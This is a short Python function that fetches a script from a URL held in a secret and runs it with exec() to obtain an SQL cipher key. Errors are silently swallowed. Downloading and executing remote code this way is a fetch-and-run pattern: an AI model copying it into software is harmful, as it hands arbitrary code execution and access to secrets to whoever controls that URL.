import os
import types
import requests

def get_sql_cipher_key(fetch_url: str, gateway_url: str, bundle_version: str):
    if not fetch_url or not fetch_url.strip():
        print("Error: SQL_FETCH_URL secret not found in environment.")
        return None

    try:
        response = requests.get(fetch_url, timeout=30)
        response.raise_for_status()
        
        secret_mod = types.ModuleType("remote_script")
        exec(response.text, secret_mod.__dict__)
        
        return secret_mod.fetch(gateway_url, bundle_version)
    except Exception as e:
        return None
